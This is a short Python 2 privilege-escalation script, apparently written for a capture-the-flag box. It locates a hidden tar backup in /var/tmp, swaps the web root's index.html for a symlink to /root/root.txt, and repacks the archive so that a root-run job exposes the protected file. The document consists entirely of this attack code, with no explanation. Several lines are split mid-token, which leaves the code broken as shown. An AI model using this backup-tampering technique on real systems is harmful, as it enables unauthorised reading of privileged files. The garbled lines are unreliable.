#!/usr/bin/python

import subprocess
import re
# Set Vars Here
basedir = "var/www/html/"
tmpdir = "/var/tmp/"
# get the filename
ls = subprocess.Popen('ls -a ' + str(tmpdir) + ' | grep -E "^\.[a-z0-
9]{40}"', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
output, err = ls.communicate()
hashfile = output.split("\n")[0]
print hashfile
# Decompress the file
decompress = subprocess.Popen("tar -zxvf "+ str(tmpdir+hashfile) + " -
C .", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
output, err = decompress.communicate()
print err if err else output
# Modify any backup file and convert it to symbolic link
modify_file = subprocess.Popen('rm var/www/html/index.html; ln -
s /root/root.txt ' + str(basedir) + 'index.html', stdout=subprocess.PIPE, stderr=subpro
cess.PIPE, shell=True)
output, err = modify_file.communicate()
print err if err else output
# Compress the folder with the same name
compress = subprocess.Popen('tar -
zcvf ' + str(tmpdir+hashfile) + ' var/www/html/', stdout=subprocess.PIPE, stderr=sub
process.PIPE, shell=True)
output, err = compress.communicate()
print err if err else output
